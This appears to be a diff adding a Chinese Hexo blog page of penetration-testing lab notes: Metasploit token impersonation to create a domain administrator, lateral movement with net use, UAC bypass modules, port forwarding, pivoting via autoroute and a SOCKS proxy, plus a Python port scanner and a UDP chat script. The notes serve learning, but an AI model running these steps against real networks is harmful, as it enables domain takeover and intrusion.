@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-纵向移动和横向移动" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/21/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-date">
+  <time datetime="2023-02-21T14:34:08.000Z" itemprop="datePublished">2023-02-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/21/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">纵向移动和横向移动</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h4><p>使用msfconsole 木马上线</p>
+<h3 id="纵向移动"><a href="#纵向移动" class="headerlink" title="纵向移动"></a>纵向移动</h3><ol>
+<li>ps  查看进程找一个administrator进程迁移进去<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213193817666.png" alt="image-20230213193817666"></li>
+<li>比如2436   migrate 2436</li>
+<li>getuid查看权限<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213193855382.png" alt="image-20230213193855382"></li>
+<li><img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213193922580.png" alt="image-20230213193922580"></li>
+<li>盗用令牌   impersonate_token JXG\Administrator<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213194022843.png" alt="image-20230213194022843"></li>
+<li>add_user jxg Test123! -h 192.168.138.132  使用提到的权限在IP地址是域控制服务器中添加一个用户<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213194118082.png" alt="image-20230213194118082"></li>
+<li>把新创建的用户加入域管理员组变相提权  add_group_user “domain admins” jxg -h 192.168.138.132<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213194106353.png" alt="image-20230213194106353"></li>
+<li>shell中输入net group “domain admins” /domain  查看是否成功添加到组<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213194158243.png" alt="image-20230213194158243"></li>
+</ol>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ol>
+<li><p>在win2008上 映射网络驱动器<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213194549370.png" alt="image-20230213194549370"></p>
+</li>
+<li><p>输入创建的域管理员账号密码<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213194649459.png" alt="image-20230213194649459"></p>
+</li>
+<li><p>连接完成<img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213194730592.png" alt="image-20230213194730592"></p>
+</li>
+<li><p>```<br>或者命令行  net use \192.168.138.132\c$ “Test123!” /user:jxg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">5. net share</span><br><span class="line"></span><br><span class="line">6. net use</span><br><span class="line"></span><br><span class="line">7. ```</span><br><span class="line">   dir \\192.168.138.132\c$</span><br></pre></td></tr></table></figure></li>
+<li><p>```<br>type \192.168.138.132\c$\this-is-dc.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">9. ```</span><br><span class="line">   net use \\192.168.138.132\ipc$ &quot;Test123!&quot; /user:jxg</span><br></pre></td></tr></table></figure></li>
+<li><p><img src="/img/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20230213200234876.png" alt="image-20230213200234876"></p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/21/%E7%BA%B5%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="cleecyc6j0005nguz0yu1btqw" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-uac" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/21/uac/" class="article-date">
+  <time datetime="2023-02-21T14:20:27.000Z" itemprop="datePublished">2023-02-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/21/uac/">uac提权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h3><p>两种方式</p>
+<h4 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h4><p>msfconsole 木马连接上后放入后台</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><ol>
+<li> use exploit/windows/local/bypassuac </li>
+<li>show options ，set session </li>
+<li>run</li>
+</ol>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><ol>
+<li>use exploit/windows/local/ask</li>
+<li>show options</li>
+<li>set session 1<img src="/img/uac/image-20230213193537068.png" alt="image-20230213193537068"></li>
+<li>在用户那输入用户密码就会建立连接</li>
+<li>会发现新创建了个sessions<img src="/img/uac/image-20230213193604590.png" alt="image-20230213193604590"></li>
+<li>在新sessions中使用getuid进行查看权限</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/21/uac/" data-id="cleecgaiy00006suz9g8o05u6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-portyinhsehezhuanfa" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/20/portyinhsehezhuanfa/" class="article-date">
+  <time datetime="2023-02-20T06:32:41.000Z" itemprop="datePublished">2023-02-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/20/portyinhsehezhuanfa/">端口映射和转发</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h3><p>假设目标主机在msf中上线</p>
+<h4 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h4><ol>
+<li>清空记录 portfwd flush </li>
+<li>连接黑客ip 端口2020 转发到 内网主机的80端口   portfwd  add -L 192.168.80.128 -l 2020 -p 80 -r 192.168.138.130<img src="/img/portyinhsehezhuanfa/image-20230214100630136.png" alt="image-20230214100630136"></li>
+<li>直接在火狐上使用1270.0.1:2020端口映射过去</li>
+</ol>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><ol>
+<li>把目标的 3389端口连接到黑客的 5555 端口 portfwd add -l 5555 -p 3389 -r192.168.138.130</li>
+<li>新开页面 rdesktop 127.0.0.1：5555 可以远程登录到目标主机</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/20/portyinhsehezhuanfa/" data-id="clech12oh0002v0uz9cejg2uc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-pivoting" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/13/pivoting/" class="article-date">
+  <time datetime="2023-02-12T16:27:28.000Z" itemprop="datePublished">2023-02-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/13/pivoting/">pivoting跳板攻击和自动路由</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="pivoting跳板攻击和自动路由"><a href="#pivoting跳板攻击和自动路由" class="headerlink" title="pivoting跳板攻击和自动路由"></a>pivoting跳板攻击和自动路由</h3><ol>
+<li><p>使用msf生成木马<img src="/img/pivoting/image-20230212213822716.png" alt="image-20230212213822716"></p>
+</li>
+<li><p>使用python开启文件服务器  python2  -m SimpleHTTPServer 8080 <img src="/img/pivoting/image-20230212213846979.png" alt="image-20230212213846979"></p>
+</li>
+<li><p>在win2012-dc服务器上下载msf生成的木马<img src="/img/pivoting/image-20230212213732500.png" alt="image-20230212213732500"></p>
+</li>
+<li><p>上线<img src="/img/pivoting/image-20230212213953386.png" alt="image-20230212213953386"></p>
+</li>
+<li><p>进行提权<img src="/img/pivoting/image-20230212214119277.png" alt="image-20230212214119277"></p>
+</li>
+<li><p>连接上查看ipconfig  发现两个ip  认为是有域服务<img src="/img/pivoting/image-20230212214048968.png" alt="image-20230212214048968"></p>
+</li>
+<li><p>使用run post/windows/gather/arp_scanner RHOSTS=192.168.138.0/24扫描内网信息<img src="/img/pivoting/image-20230212214139675.png" alt="image-20230212214139675"></p>
+</li>
+<li><p> run post/multi/manage/autoroute 使用自动路由    run autoroute -p   <img src="/img/pivoting/image-20230212214212172.png" alt="image-20230212214212172"></p>
+</li>
+<li><p>放入后台backgroud</p>
+</li>
+<li><p>使用socket代理   use auxiliary/server/socks_proxy <img src="/img/pivoting/image-20230212214302073.png" alt="image-20230212214302073"></p>
+</li>
+<li><p>show options </p>
+</li>
+<li><p>设置为自己的10044端口接收socke协议，可以嫁接到自动路由上<img src="/img/pivoting/image-20230212214513204.png" alt="image-20230212214513204"></p>
+</li>
+<li><p>运行run</p>
+</li>
+<li><p>jobs发现运行了</p>
+</li>
+<li><p>nano /etc/proxychains4.conf    进入socket配置文件加入<img src="/img/pivoting/image-20230212214854307.png" alt="image-20230212214854307"></p>
+</li>
+<li><p>保存退出      nano：使用快捷Ctrl+X，然后会提示输入Y保存修改、输入N放弃修改。vi：首先需要按ESC键回到命令模式；然后输入:wq 保存文件并退出vi；最后回车即可。</p>
+</li>
+<li><p>怎么证明进入它的内网打开火狐  proxychains firefox    输入域中的网站<img src="/img/pivoting/image-20230213001954990.png" alt="image-20230213001954990"></p>
+</li>
+<li><p>使用nmap扫描常用端口     proxychains nmap -sT -Pn 192.168.138.130  开启了 445端口<img src="/img/pivoting/image-20230213002306588.png" alt="image-20230213002306588"></p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/13/pivoting/" data-id="clech12of0001v0uza379c9fl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-fuza-port-saomiao" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/08/fuza-port-saomiao/" class="article-date">
+  <time datetime="2023-02-08T15:00:41.000Z" itemprop="datePublished">2023-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/08/fuza-port-saomiao/">端口扫描器（optparse模块OptionParser方法）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="一、optparse模块OptionParser的使用方法"><a href="#一、optparse模块OptionParser的使用方法" class="headerlink" title="一、optparse模块OptionParser的使用方法"></a>一、optparse模块OptionParser的使用方法</h3><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p>​       optparse，是一个更够让程序设计人员轻松设计出简单明了、易于使用、符合标准的Unix命令例程式的Python模块。生成使用和帮助信息</p>
+<p>   首先你必须导入该类，并创建一个OptionParser对象，然后再使用parser.add_option(…)待定义命令行参数，及其帮助文档。</p>
+<p>​        每个命令行参数就是由参数名字符串和参数属性组成的。如 -f 或者 file 分别是长短参数名:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parser.add_option(&quot;-f&quot;, &quot;--file&quot;, ...)</span><br></pre></td></tr></table></figure>
+
+<p>​        当你将所有的命令行参数都定义好了的时候，我们需要调用parse_args()方法赖际熙add_option()函数依次传入的参数：</p>
+<p>options,args  =  parser.parser_args()<br>       options 是一个字典，其key字典中的关键字可能会是是我们所有的add_option()函数中的dest参数值，其对应的value值，是命令行输入的对应的add_option()函数的参数值。</p>
+<h3 id="二、源代码"><a href="#二、源代码" class="headerlink" title="二、源代码"></a>二、源代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="comment">#判断端口是否开放</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">ip,port</span>):</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip,port))<span class="comment">#判断是否连接</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#默认扫描的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">ip,portlist</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> portlist:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">open</span>(ip,x):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s host %s port open&quot;</span>%(ip,x))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s host %s port close&quot;</span>%(ip,x))</span><br><span class="line">            </span><br><span class="line"><span class="comment">#范围扫描</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rescan</span>(<span class="params">ip,s,e</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(s,e):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">open</span>(ip,x):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s host %s port open&quot;</span>%(ip,x))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s host %s port close&quot;</span>%(ip,x))</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    usage=<span class="string">&quot;usage:xxx.py -i ip地址 -p 端口&quot;</span></span><br><span class="line">    parse=OptionParser(usage=usage)</span><br><span class="line">    parse.add_option(<span class="string">&quot;-i&quot;</span>,<span class="string">&quot;--ip&quot;</span>,<span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,dest=<span class="string">&quot;ipaddress&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;your target ip here&quot;</span>)</span><br><span class="line">    parse.add_option(<span class="string">&quot;-p&quot;</span>,<span class="string">&quot;--port&quot;</span>,<span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,dest=<span class="string">&quot;port&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;your target port here&quot;</span>)</span><br><span class="line">    (options,args)=parse.parse_args()</span><br><span class="line">    ip=options.ipaddress</span><br><span class="line">    port=options.port</span><br><span class="line">    dport=[<span class="number">135</span>,<span class="number">139</span>,<span class="number">445</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">5944</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;,&#x27;</span> <span class="keyword">in</span> port: <span class="comment">#xx.py -i 127.0.0.1 -p 80,99</span></span><br><span class="line">        port =port.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        a=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> port:</span><br><span class="line">            a.append(<span class="built_in">int</span>(i))</span><br><span class="line">        scan(ip,a)</span><br><span class="line">    eli<span class="string">f&#x27;-&#x27;</span> <span class="keyword">in</span> port:    <span class="comment">#xx.py -i 127.0.0.1 -p 80-99</span></span><br><span class="line">        port=port.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        s=<span class="built_in">int</span>(port[<span class="number">0</span>])</span><br><span class="line">        e=<span class="built_in">int</span>(port[<span class="number">1</span>])</span><br><span class="line">        rescan(ip,s,e)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;all&#x27;</span> <span class="keyword">in</span> port: <span class="comment">#xx.py -i 127.0.0.1 -p all</span></span><br><span class="line">        rescan(ip,<span class="number">1</span>,<span class="number">65535</span>)</span><br><span class="line">    eli<span class="string">f&#x27;default&#x27;</span> <span class="keyword">in</span> port:<span class="comment">#xx.py -i 127.0.0.1 -p default</span></span><br><span class="line">        scan(ip,dport)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、演示"><a href="#三、演示" class="headerlink" title="三、演示"></a>三、演示</h3><ol>
+<li>输入 -help</li>
+</ol>
+<p><img src="/img/fuza-port-saomiao/image-20230208232832386.png" alt="image-20230208232832386"></p>
+<ol start="2">
+<li>输入 -i [ip] -p [port]</li>
+</ol>
+<p><img src="/img/fuza-port-saomiao/image-20230208231643798.png" alt="image-20230208231643798"></p>
+<ol start="3">
+<li>输入 -i [ip] -p [135 ,8080]</li>
+</ol>
+<p><img src="/img/fuza-port-saomiao/image-20230208231954147.png" alt="image-20230208231954147"></p>
+<ol start="4">
+<li>输入 -i [ip] -p [135 -150]</li>
+</ol>
+<p><img src="/img/fuza-port-saomiao/image-20230208232437882.png" alt="image-20230208232437882"></p>
+<ol start="5">
+<li>输入 -i [ip] -p [all]</li>
+</ol>
+<p><img src="/img/fuza-port-saomiao/image-20230208233440220.png" alt="image-20230208233440220"></p>
+<ol start="6">
+<li>输入 -i [ip] -p [default]</li>
+</ol>
+<p><img src="/img/fuza-port-saomiao/image-20230208233645637.png" alt="image-20230208233645637"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/08/fuza-port-saomiao/" data-id="clech12o90000v0uzfpp2cd82" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-udpliaotianshi" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/08/udpliaotianshi/" class="article-date">
+  <time datetime="2023-02-08T15:00:01.000Z" itemprop="datePublished">2023-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/08/udpliaotianshi/">upd聊天室</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="一、Socket"><a href="#一、Socket" class="headerlink" title="一、Socket"></a>一、Socket</h3><p>Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。</p>
+<h3 id="二、源代码"><a href="#二、源代码" class="headerlink" title="二、源代码"></a>二、源代码</h3><h4 id="用户1"><a href="#用户1" class="headerlink" title="用户1"></a>用户1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_msg</span>(<span class="params">udp_socket</span>):</span><br><span class="line">    dest_ip=<span class="built_in">input</span>(<span class="string">&quot;请输入对方ip:&quot;</span>)</span><br><span class="line">    dest_port=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入对方端口:&quot;</span>))</span><br><span class="line">    send_data=<span class="built_in">input</span>(<span class="string">&quot;你想说啥:&quot;</span>)</span><br><span class="line">    udp_socket.sendto(send_data.encode(<span class="string">&quot;utf-8&quot;</span>),(dest_ip,dest_port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_msg</span>(<span class="params">upd_socket</span>):</span><br><span class="line">    recv_data=upd_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s 说了 %s&quot;</span>%( <span class="built_in">str</span>(recv_data[<span class="number">1</span>]),recv_data[<span class="number">0</span>].decode(<span class="string">&quot;utf-8&quot;</span>) ) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">    udp_socket.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">6001</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_msg(udp_socket)</span><br><span class="line">        send_msg(udp_socket)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h4 id="用户2"><a href="#用户2" class="headerlink" title="用户2"></a>用户2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_msg</span>(<span class="params">udp_socket</span>):</span><br><span class="line">    dest_ip=<span class="built_in">input</span>(<span class="string">&quot;请输入对方ip:&quot;</span>)</span><br><span class="line">    dest_port=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入对方端口:&quot;</span>))</span><br><span class="line">    send_data=<span class="built_in">input</span>(<span class="string">&quot;你想说啥:&quot;</span>)</span><br><span class="line">    udp_socket.sendto(send_data.encode(<span class="string">&quot;utf-8&quot;</span>),(dest_ip,dest_port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_msg</span>(<span class="params">upd_socket</span>):</span><br><span class="line">    recv_data=upd_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s 说了 %s&quot;</span>%( <span class="built_in">str</span>(recv_data[<span class="number">1</span>]),recv_data[<span class="number">0</span>].decode(<span class="string">&quot;utf-8&quot;</span>) ) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">    udp_socket.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">6000</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send_msg(udp_socket)</span><br><span class="line">        recv_msg(udp_socket)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><ol>
+<li>用户1 输入用户2 的ip、端口号</li>
+</ol>
+<p><img src="/img/udpliaotianshi/image-20230208234105569.png" alt="image-20230208234105569"></p>
+<ol start="2">
+<li>用户1 向用户2发送消息</li>
+</ol>
+<p><img src="/img/udpliaotianshi/image-20230208234142928.png" alt="image-20230208234142928"></p>
+<ol start="3">
+<li>用户2接收到用户1发送的消息</li>
+</ol>
+<p><img src="/img/udpliaotianshi/image-20230208234216499.png" alt="image-20230208234216499"></p>
+<ol start="4">
+<li>用户2向用户1返回消息</li>
+</ol>
+<p><img src="/img/udpliaotianshi/image-20230208234255222.png" alt="image-20230208234255222"></p>
+<ol start="5">
+<li>用户1 接收到用户2发送的消息</li>
+</ol>
+<p><img src="/img/udpliaotianshi/image-20230208234324064.png" alt="image-20230208234324064"></p>
+
+      
+    </div>
+    <footer class="article-footer">
